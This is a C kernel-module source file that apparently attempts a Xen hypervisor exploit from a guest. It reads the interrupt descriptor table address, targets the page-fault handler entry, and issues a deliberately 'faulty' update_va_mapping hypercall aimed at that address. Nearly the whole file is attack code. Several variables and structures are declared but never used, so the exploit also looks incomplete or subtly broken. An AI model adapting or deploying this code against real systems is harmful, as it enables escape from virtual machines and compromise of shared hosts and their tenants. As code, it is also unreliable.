#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <asm/xen/page.h>
#include <asm/xen/hypercall.h> 

unsigned long call_xen_memory_op(unsigned long op, void *argp);
unsigned long call_xen_update_va_mapping(void *virt, unsigned long pte, unsigned long flags);
unsigned long read_idt_addr(void);

#define XENMEM_exchange 11UL
#define DOMID_SELF (0x7FF0U)
#define INTERRUPT_PAGEFAULT 14

struct xen_memory_reservation {
    u64 extent_start;
    u64 nr_extents;
    u32 extent_order;
    u32 address_bits;
    u16 domid;
};

struct xen_memory_exchange {
    struct xen_memory_reservation in;
    struct xen_memory_reservation out;
    u64 nr_exchanged;
};

static int init_test(void) {
  pr_warn("call_xen_memory_op is at %p\n", call_xen_memory_op);
  return 0;
}

static void cleanup_test(void) {
  u64 idt_addr, target_addr, in_extent, nr_exchanged,
      nr_extents, in_extent_addr, in_extent_base;
  void *victim_page_virt;
  struct xen_memory_exchange args;
  unsigned long ret;
  pte_t p;

  // hypervisor is lower than kernel, so hypervisor reference has to come first
  #define OUT_EXTENT_BASE_ADDR 0

  idt_addr = read_idt_addr();
  pr_warn("IDT at 0x%llx\n", idt_addr);
  target_addr = idt_addr + 16 * INTERRUPT_PAGEFAULT;
  pr_warn("Target address, (page fault handler): 0x%llx\n", target_addr);
  if ((target_addr & 0x7) != 0) {
    pr_warn("target_addr misaligned\n");
    return;
  }

  victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
  in_extent = virt_to_mfn(victim_page_virt);

  p.pte = target_addr;

  ret =   HYPERVISOR_faulty_update_va_mapping(victim_page_virt, p, UVMF_TLB_FLUSH);

}

module_init(init_test);
module_exit(cleanup_test);
MODULE_LICENSE("GPL v2");

